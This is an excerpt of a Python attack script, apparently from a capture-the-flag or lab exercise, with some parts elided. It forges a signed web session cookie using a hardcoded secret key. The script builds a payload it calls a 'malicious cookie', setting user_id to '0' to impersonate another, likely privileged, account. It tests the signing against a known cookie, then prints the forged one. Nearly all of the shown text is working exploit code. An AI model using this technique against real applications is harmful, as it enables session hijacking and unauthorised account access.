...
def encrypt(cookie, secret_key):
    ...
    s = Signer(secret_key) # key_derivation = concat|django-concat|hmac
    signature = s.get_signature(cookie)
    data += '.' + signature

    # or sign the compressed / b64 encoded data?
    #data = s.sign(data)

    if compress: # if compression used, prefix string with a period
        data = '.' + data
...
cookie_exploit = '{"_fresh":true,"_id":"ad3e390400654a74a8f02506a4fb83dd3342218b45d89c6865eb3d378ea542d49c56f323aebdfff8235f53f4e2fcf89aa2c5e5a119c6a7e81cac0ac4d196a0d3","csrf_token":"5e5826612553886b91c518783384b26848dbb45f","user_id":"0"}'

secret_key = '385c16dd09098b011d0086f9e218a0a2'
#secret_key = base64_decode('OFwW3QkJiwEdAIb54higog==')

print(decrypt(cookie))
print(encrypt(cookie_plain, secret_key)) # see if we can get our own cookie back

# encode our malicious cookie
print(encrypt(cookie_exploit, secret_key))
